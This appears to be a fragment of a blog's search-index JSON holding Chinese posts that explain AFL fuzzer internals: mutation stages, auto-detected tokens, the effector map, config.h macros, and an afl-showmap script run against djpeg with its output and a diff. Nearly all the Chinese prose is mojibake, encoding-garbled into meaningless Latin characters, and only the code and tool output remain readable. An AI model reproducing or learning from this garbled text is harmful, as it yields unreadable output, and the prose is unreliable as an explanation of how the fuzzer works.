dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢/æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­ havocï¼Œä¸­æ–‡æ„æ€æ˜¯â€œå¤§ç ´åâ€ï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ spliceï¼Œä¸­æ–‡æ„æ€æ˜¯â€œæ‹¼æ¥â€ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ å…¶ä¸­ï¼Œå‰å››é¡¹ bitflip, arithmetic, interest, dictionary æ˜¯é dumb modeï¼ˆ-dï¼‰å’Œä¸» fuzzerï¼ˆ-Mï¼‰ä¼šè¿›è¡Œçš„æ“ä½œï¼Œç”±äºå…¶å˜å¼‚æ–¹å¼æ²¡æœ‰éšæœºæ€§ï¼Œæ‰€ä»¥ä¹Ÿç§°ä¸º deterministic fuzzing ï¼›havoc å’Œ splice åˆ™å­˜åœ¨éšæœºæ€§ï¼Œæ˜¯æ‰€æœ‰çŠ¶å†µçš„ fuzzerï¼ˆæ˜¯å¦ dumb modeã€ä¸»ä» fuzzerï¼‰éƒ½ä¼šæ‰§è¡Œçš„å˜å¼‚ã€‚ ä»¥ä¸‹å°†å¯¹è¿™äº›å˜å¼‚ç±»å‹è¿›è¡Œå…·ä½“ä»‹ç»ã€‚ ###ï¼ˆ1ï¼‰ bitflip æ‹¿åˆ°ä¸€ä¸ªåŸå§‹æ–‡ä»¶ï¼Œé¦–å…ˆè¿›è¡Œçš„å°±æ˜¯bitflipï¼Œè€Œä¸”è¿˜ä¼šæ ¹æ®ç¿»è½¬é‡/æ­¥é•¿è¿›è¡Œå¤šç§ä¸åŒçš„ç¿»è½¬ï¼ŒæŒ‰ç…§é¡ºåºä¾æ¬¡ä¸ºï¼š bitflip 1/1ï¼Œ æ¯æ¬¡ç¿»è½¬1ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 2/1ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„2ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 4/1ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„4ä¸ªbitï¼ŒæŒ‰ç…§æ¯1ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ bitflip 8/8ï¼Œ æ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„8ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªbyteåšç¿»è½¬ bitflip 16/8ï¼Œæ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„16ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªwordåšç¿»è½¬ bitflip 32/8ï¼Œæ¯æ¬¡ç¿»è½¬ç›¸é‚»çš„32ä¸ªbitï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³ä¾æ¬¡å¯¹æ¯ä¸ªdwordåšç¿»è½¬ åœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼ŒAFLå·§å¦™åœ°åµŒå…¥äº†ä¸€äº›å¯¹æ–‡ä»¶æ ¼å¼çš„å¯å‘å¼åˆ¤æ–­ï¼Œä»¥å›¾å°½å¯èƒ½å¤šå¾—è·å–æ–‡ä»¶ä¿¡æ¯ã€‚ è‡ªåŠ¨æ£€æµ‹token åœ¨è¿›è¡Œ bitflip 1/1å˜å¼‚æ—¶ï¼Œå¯¹äºæ¯ä¸ª byte çš„æœ€ä½ä½( least significant bit )ç¿»è½¬è¿˜è¿›è¡Œäº†é¢å¤–çš„å¤„ç†ï¼šå¦‚æœè¿ç»­å¤šä¸ª bytes çš„æœ€ä½ä½è¢«ç¿»è½¬åï¼Œç¨‹åºçš„æ‰§è¡Œè·¯å¾„éƒ½æœªå˜åŒ–ï¼Œè€Œä¸”ä¸åŸå§‹æ‰§è¡Œè·¯å¾„ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆå°±æŠŠè¿™ä¸€æ®µè¿ç»­çš„ bytes åˆ¤æ–­æ˜¯ä¸€æ¡tokenã€‚ ä¾‹å¦‚ï¼ŒPNGæ–‡ä»¶ä¸­ç”¨IHDRä½œä¸ºèµ·å§‹å—çš„æ ‡è¯†ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ç±»ä¼¼äºä»¥ä¸‹çš„å†…å®¹ï¼š ........IHDR........ å½“ç¿»è½¬åˆ°å­—ç¬¦Içš„æœ€é«˜ä½æ—¶ï¼Œå› ä¸ºIHDRè¢«ç ´åï¼Œæ­¤æ—¶ç¨‹åºçš„æ‰§è¡Œè·¯å¾„è‚¯å®šä¸å¤„ç†æ­£å¸¸æ–‡ä»¶çš„è·¯å¾„æ˜¯ä¸åŒçš„ï¼›éšåï¼Œåœ¨ç¿»è½¬æ¥ä¸‹æ¥3ä¸ªå­—ç¬¦çš„æœ€é«˜ä½æ—¶ï¼ŒIHDRæ ‡è¯†åŒæ ·è¢«ç ´åï¼Œç¨‹åºåº”è¯¥ä¼šé‡‡å–åŒæ ·çš„æ‰§è¡Œè·¯å¾„ã€‚ç”±æ­¤ï¼ŒAFLå°±åˆ¤æ–­å¾—åˆ°ä¸€ä¸ªå¯èƒ½çš„tokenï¼šIHDRï¼Œå¹¶å°†å…¶è®°å½•ä¸‹æ¥ä¸ºåé¢çš„å˜å¼‚æä¾›å¤‡é€‰ã€‚ AFLé‡‡å–çš„è¿™ç§æ–¹å¼æ˜¯éå¸¸å·§å¦™çš„ï¼šå°±æœ¬è´¨è€Œè¨€ï¼Œè¿™å®é™…ä¸Šæ˜¯å¯¹æ¯ä¸ªbyteè¿›è¡Œä¿®æ”¹å¹¶æ£€æŸ¥æ‰§è¡Œè·¯å¾„ï¼›ä½†é›†æˆåˆ°bitflipåï¼Œå°±ä¸éœ€è¦å†æµªè´¹é¢å¤–çš„æ‰§è¡Œèµ„æºäº†ã€‚æ­¤å¤–ï¼Œä¸ºäº†æ§åˆ¶è¿™æ ·è‡ªåŠ¨ç”Ÿæˆçš„tokençš„å¤§å°å’Œæ•°é‡ï¼ŒAFLè¿˜åœ¨config.hä¸­é€šè¿‡å®å®šä¹‰äº†é™åˆ¶ï¼š /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) å¯¹äºä¸€äº›æ–‡ä»¶æ¥è¯´ï¼Œæˆ‘ä»¬å·²çŸ¥å…¶æ ¼å¼ä¸­å‡ºç°çš„tokené•¿åº¦ä¸ä¼šè¶…è¿‡4ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹ MAX_AUTO_EXTRA ä¸º4å¹¶é‡æ–°ç¼–è¯‘AFLï¼Œä»¥æ’é™¤ä¸€äº›æ˜æ˜¾ä¸ä¼šæ˜¯tokençš„æƒ…å†µã€‚é—æ†¾çš„æ˜¯ï¼Œè¿™äº›è®¾ç½®æ˜¯é€šè¿‡å®å®šä¹‰æ¥å®ç°ï¼Œæ‰€ä»¥ä¸èƒ½åšåˆ°è¿è¡Œæ—¶æŒ‡å®šï¼Œæ¯æ¬¡ä¿®æ”¹åå¿…é¡»é‡æ–°ç¼–è¯‘AFLã€‚ ç”Ÿæˆeffector map åœ¨è¿›è¡Œbitflip 8/8å˜å¼‚æ—¶ï¼ŒAFLè¿˜ç”Ÿæˆäº†ä¸€ä¸ªéå¸¸é‡è¦çš„ä¿¡æ¯ï¼šeffector mapã€‚è¿™ä¸ªeffector mapå‡ ä¹è´¯ç©¿äº†æ•´ä¸ªdeterministic fuzzingçš„å§‹ç»ˆã€‚ å…·ä½“åœ°ï¼Œåœ¨å¯¹æ¯ä¸ªbyteè¿›è¡Œç¿»è½¬æ—¶ï¼Œå¦‚æœå…¶é€ æˆæ‰§è¡Œè·¯å¾„ä¸åŸå§‹è·¯å¾„ä¸ä¸€è‡´ï¼Œå°±å°†è¯¥byteåœ¨effector mapä¸­æ ‡è®°ä¸º1ï¼Œå³â€œæœ‰æ•ˆâ€çš„ï¼Œå¦åˆ™æ ‡è®°ä¸º0ï¼Œå³â€œæ— æ•ˆâ€çš„ã€‚ è¿™æ ·åšçš„é€»è¾‘æ˜¯ï¼šå¦‚æœä¸€ä¸ªbyteå®Œå…¨ç¿»è½¬ï¼Œéƒ½æ— æ³•å¸¦æ¥æ‰§è¡Œè·¯å¾„çš„å˜åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªbyteå¾ˆæœ‰å¯èƒ½æ˜¯å±äºâ€dataâ€ï¼Œè€Œéâ€metadataâ€ï¼ˆä¾‹å¦‚size, flagç­‰ï¼‰ï¼Œå¯¹æ•´ä¸ªfuzzingçš„æ„ä¹‰ä¸å¤§ã€‚æ‰€ä»¥ï¼Œåœ¨éšåçš„ä¸€äº›å˜å¼‚ä¸­ï¼Œä¼šå‚è€ƒeffector mapï¼Œè·³è¿‡é‚£äº›â€œæ— æ•ˆâ€çš„byteï¼Œä»è€ŒèŠ‚çœäº†æ‰§è¡Œèµ„æºã€‚ ç”±æ­¤ï¼Œé€šè¿‡æå°çš„å¼€é”€ï¼ˆæ²¡æœ‰å¢åŠ é¢å¤–çš„æ‰§è¡Œæ¬¡æ•°ï¼‰ï¼ŒAFLåˆä¸€æ¬¡å¯¹æ–‡ä»¶æ ¼å¼è¿›è¡Œäº†å¯å‘å¼çš„åˆ¤æ–­ã€‚çœ‹åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸å¹æœäºAFLå®ç°ä¸Šçš„ç²¾å¦™ã€‚ ä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¹¶ä¸ä¼šæ£€æµ‹æœ‰æ•ˆå­—ç¬¦ã€‚ç¬¬ä¸€ç§æƒ…å†µå°±æ˜¯dumb modeæˆ–è€…ä»fuzzerï¼Œæ­¤æ—¶æ–‡ä»¶æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å¯èƒ½è¢«å˜å¼‚ã€‚ç¬¬äºŒã€ç¬¬ä¸‰ç§æƒ…å†µä¸æ–‡ä»¶æœ¬èº«æœ‰å…³ï¼š /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 å³é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ–‡ä»¶å°äº128 bytesï¼Œé‚£ä¹ˆæ‰€æœ‰å­—ç¬¦éƒ½æ˜¯â€œæœ‰æ•ˆâ€çš„ï¼›åŒæ ·åœ°ï¼Œå¦‚æœAFLå‘ç°ä¸€ä¸ªæ–‡ä»¶æœ‰è¶…è¿‡90%çš„byteséƒ½æ˜¯â€œæœ‰æ•ˆâ€çš„ï¼Œé‚£ä¹ˆä¹Ÿä¸å·®é‚£10%äº†ï¼Œå¤§ç¬”ä¸€æŒ¥ï¼Œå¹²è„†æŠŠæ‰€æœ‰å­—ç¬¦éƒ½åˆ’å½’ä¸ºâ€œæœ‰æ•ˆâ€ã€‚ ###ï¼ˆ2ï¼‰ arithmetic åœ¨bitflipå˜å¼‚å…¨éƒ¨è¿›è¡Œå®Œæˆåï¼Œä¾¿è¿›å…¥ä¸‹ä¸€ä¸ªé˜¶æ®µï¼šarithmeticã€‚ä¸bitflipç±»ä¼¼çš„æ˜¯ï¼Œarithmeticæ ¹æ®ç›®æ ‡å¤§å°çš„ä¸åŒï¼Œä¹Ÿåˆ†ä¸ºäº†å¤šä¸ªå­é˜¶æ®µï¼š arith 8/8ï¼Œæ¯æ¬¡å¯¹8ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªbyteè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ arith 16/8ï¼Œæ¯æ¬¡å¯¹16ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªwordè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ arith 32/8ï¼Œæ¯æ¬¡å¯¹32ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªdwordè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ åŠ å‡å˜å¼‚çš„ä¸Šé™ï¼Œåœ¨config.hä¸­çš„å®ARITH_MAXå®šä¹‰ï¼Œé»˜è®¤ä¸º35ã€‚æ‰€ä»¥ï¼Œå¯¹ç›®æ ‡æ•´æ•°ä¼šè¿›è¡Œ+1, +2, â€¦, +35, -1, -2, â€¦, -35çš„å˜å¼‚ã€‚ç‰¹åˆ«åœ°ï¼Œç”±äºæ•´æ•°å­˜åœ¨å¤§ç«¯åºå’Œå°ç«¯åºä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼ŒAFLä¼šè´´å¿ƒåœ°å¯¹è¿™ä¸¤ç§æ•´æ•°è¡¨ç¤ºæ–¹å¼éƒ½è¿›è¡Œå˜å¼‚ã€‚ æ­¤å¤–ï¼ŒAFLè¿˜ä¼šæ™ºèƒ½åœ°è·³è¿‡æŸäº›arithmeticå˜å¼‚ã€‚ç¬¬ä¸€ç§æƒ…å†µå°±æ˜¯å‰é¢æåˆ°çš„effector mapï¼šå¦‚æœä¸€ä¸ªæ•´æ•°çš„æ‰€æœ‰byteséƒ½è¢«åˆ¤æ–­ä¸ºâ€œæ— æ•ˆâ€ï¼Œé‚£ä¹ˆå°±è·³è¿‡å¯¹æ•´æ•°çš„å˜å¼‚ã€‚ç¬¬äºŒç§æƒ…å†µæ˜¯ä¹‹å‰bitflipå·²ç»ç”Ÿæˆè¿‡çš„å˜å¼‚ï¼šå¦‚æœåŠ /å‡æŸä¸ªæ•°åï¼Œå…¶æ•ˆæœä¸ä¹‹å‰çš„æŸç§bitflipç›¸åŒï¼Œé‚£ä¹ˆè¿™æ¬¡å˜å¼‚è‚¯å®šåœ¨ä¸Šä¸€ä¸ªé˜¶æ®µå·²ç»æ‰§è¡Œè¿‡äº†ï¼Œæ­¤æ¬¡ä¾¿ä¸ä¼šå†æ‰§è¡Œã€‚ ###ï¼ˆ3ï¼‰ interest ä¸‹ä¸€ä¸ªé˜¶æ®µæ˜¯interestï¼Œå…·ä½“å¯åˆ†ä¸ºï¼š interest 8/8ï¼Œæ¯æ¬¡å¯¹8ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªbyteè¿›è¡Œæ›¿æ¢ interest 16/8ï¼Œæ¯æ¬¡å¯¹16ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªwordè¿›è¡Œæ›¿æ¢ interest 32/8ï¼Œæ¯æ¬¡å¯¹32ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªdwordè¿›è¡Œæ›¿æ¢ è€Œç”¨äºæ›¿æ¢çš„â€interesting valuesâ€ï¼Œæ˜¯AFLé¢„è®¾çš„ä¸€äº›æ¯”è¾ƒç‰¹æ®Šçš„æ•°ï¼š static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; è¿™äº›æ•°çš„å®šä¹‰åœ¨config.hæ–‡ä»¶ä¸­ï¼š /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"æ•ˆæœåˆ†æ å‚è€ƒ https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html ä¸­çš„æµ‹è¯•æ–¹æ³•ï¼ŒåŒæ ·ä»¥ djpeg ä¸ºç›®æ ‡ï¼Œæœ€åˆçš„æ ·æœ¬é›†åªæœ‰ä¸€ä¸ªæ–‡æœ¬ testï¼Œé‡‡ç”¨äºŒè¿›åˆ¶æ’æ¡©çš„æ–¹å¼è¿›è¡Œfuzzï¼Œ1ä¸ªä¸»èŠ‚ç‚¹ä»¥åŠ3ä¸ªä»èŠ‚ç‚¹åŒæ—¶è¿›è¡Œï¼Œæµ‹è¯•æœ€ç»ˆæ˜¯å¦èƒ½fuzzå‡ºä¸€ä¸ªåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶ã€‚ fuzzåçš„æ ·æœ¬é›†åˆå¦‚ä¸‹ï¼š ä½¿ç”¨ afl-showmap å¯¹æ‰€æœ‰æ ·æœ¬è¿›è¡Œåˆ†æï¼Œç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ·æœ¬é›†åˆç›®å½•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¾“å‡ºç›®å½•ï¼Œå‡è®¾è„šæœ¬åä¸º djpeg.sh ï¼Œæ ·æœ¬ç›®å½•ä¸º in ï¼Œè¾“å‡ºç›®å½•ä¸º map ./djpeg.sh in map è„šæœ¬çš„æ‰§è¡Œç»“æœå¯åœ¨ åˆ†æ/djpeg_shè„šæœ¬è¾“å‡ºç»“æœ.txt ä¸­æŸ¥çœ‹ï¼Œä»¥ä¸‹åªå±•ç¤ºéƒ¨åˆ†ï¼š id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- å¯ä»¥çœ‹åˆ°ä¸Šé¢æ ·æœ¬idä¸º21å’Œ26çš„è¾“å‡ºç»“æœç›¸åŒï¼Œä½†æ˜¯æ‰§è¡Œè·¯å¾„ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨ diff æŒ‡ä»¤è¿›è¡Œè·¯å¾„å¯¹æ¯”ï¼š diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 ç»“æœå¦‚ä¸‹ï¼š --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 ä»æœ€åˆçš„åªæœ‰æ–‡æœ¬å†…å®¹â€œtestâ€çš„æ ·æœ¬ï¼Œaflç¡®å®å·²ç»å‘ç°äº†å¾ˆå¤šå…¶å®ƒè·¯å¾„ï¼Œä½†æ˜¯åœ¨æˆ‘çš„æµ‹è¯•ç»“æœä¸­è¿˜æ˜¯æ²¡æœ‰fuzzå‡ºæ­£å¸¸çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»è¾“å‡ºç»“æœä¸Šçœ‹æ ·æœ¬idä¸º21å’Œ26ç®—æ˜¯æ¯”è¾ƒæ¥è¿‘ï¼Œæ²¡æœ‰æŠ¥æ˜æ˜¾é”™è¯¯ã€‚ Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"å‚è€ƒé“¾æ¥ https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"AFLäºŒä¸‰äº‹ç³»åˆ— note 2","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯AFLç³»åˆ—ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç»AFLçš„ä¸€äº›åŸºæœ¬åŸç†ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:0:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"ä¸€ã€ä»£ç è¦†ç›–ç‡ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. è®¡ç®—æ–¹æ³• ä»£ç è¦†ç›–ç‡çš„è®¡é‡å•ä½ï¼Œé€šå¸¸æœ‰3ç§ï¼š å‡½æ•°ï¼ˆFuction-Levelï¼‰ åŸºæœ¬å—ï¼ˆBasicBlock-Levelï¼‰ è¾¹ç•Œï¼ˆEdge-Levelï¼‰ ï¼ˆ1ï¼‰å‡½æ•°ï¼ˆFuction-Levelï¼‰ è¿™ä¸ªå¾ˆå®¹æ˜“ç†è§£ï¼Œå°±æ˜¯ä»£ç æ‰§è¡Œæ—¶è°ƒç”¨åˆ°å“ªäº›å‡½æ•°ï¼Œä½†æ˜¯å‡½æ•°é‡Œé¢çš„å…·ä½“ä»£ç è¡Œå´ä¸ä½œç»Ÿè®¡ï¼Œç›¸å¯¹æ¯”è¾ƒç²—ç³™ä½†é«˜æ•ˆçš„ç»Ÿè®¡æ–¹å¼ã€‚ æ‰€ä»¥ï¼Œé€šå¸¸çš„ç»Ÿè®¡æ–¹å¼æ˜¯ç”¨åŸºæœ¬å—ï¼Œç®€ç§°BBã€‚ ï¼ˆ2ï¼‰åŸºæœ¬å—ï¼ˆBasicBlock-Levelï¼‰ åŸºæœ¬å—ï¼Œç›´æ¥çœ‹ä¸‹å›¾å°±å¾ˆå®¹æ˜“ç†è§£äº†ã€‚ IDAä¸­æ¯ä¸€å—ä»£ç å°±ä»£è¡¨ç€ä¸€ä¸ªåŸºæœ¬å—ï¼Œå°±æ˜¯ä»¥æŒ‡ä»¤è·³è½¬ä¸ºä½œåˆ’åˆ†ç•Œé™çš„ã€‚ ï¼ˆ3ï¼‰è¾¹ç•Œï¼ˆEdge-Levelï¼‰ edgeæœ¬èº«å°±æ¶µç›–äº†åŸºæœ¬å—éƒ¨åˆ†ï¼Œå”¯ä¸€çš„å·®åˆ«æ˜¯edgeå¤šè®°å½•äº†ä¸€äº›æ‰§è¡Œè¾¹ç•Œçš„ä¿¡æ¯ã€‚æ¯”å¦‚ç¤ºä¾‹ä»£ç ï¼š åœ¨IDAä¸­å¯ä»¥çœ‹åˆ°Aã€Bã€Cè¿™3ä¸ªåŸºæœ¬å—ï¼Œä½†å½“aä¸ºå‡æ—¶ï¼Œç¨‹åºå°±ä¼šä»Aæ‰§è¡Œåˆ°Cã€‚ å‰é¢åŸºæœ¬å—çš„æ–¹å¼å°±æ— æ³•ç¡®åˆ‡åœ°çŸ¥é“æ˜¯å¦æ›¾ä»Aæ‰§è¡Œåˆ°Cï¼Œå°¤å…¶æ˜¯è¯¥æ®µä»£ç è¢«å¤šæ¬¡æ‰§è¡Œçš„æƒ…å†µï¼Œå°±æ›´æ— æ³•çŸ¥é“ï¼Œè¿™æ—¶edgeè¦†ç›–æ–¹å¼å°±å‡ºç°äº†ã€‚ edgeä¼šåœ¨Aè·ŸCä¹‹é—´å»ºç«‹è™šæ‹Ÿå—Dï¼Œé€šè¿‡åˆ¤æ–­Dæ˜¯å¦æ‰§è¡Œè¿‡ï¼Œæ¥ç¡®è®¤æ˜¯å¦æ›¾ä»Aæ‰§è¡Œåˆ°Cï¼Œè¿™ç§æ–¹å¼ä¹Ÿä¼šæ¯”è¾ƒæ¶ˆè€—æ€§èƒ½ã€‚ ä»¥ä¸Šå†…å®¹æ‘˜è‡ªæ³‰å“¥åšå®¢ï¼ŒåŸæ–‡é“¾æ¥https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFLé‡‡ç”¨çš„æ˜¯ç¬¬ä¸‰ç§æ–¹å¼ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. AFLä¸­ä¸¤ç§ä»£ç è¦†ç›–ç‡è®¡ç®—æ–¹å¼ AFLæ”¯æŒä¸¤ç§ä»£ç 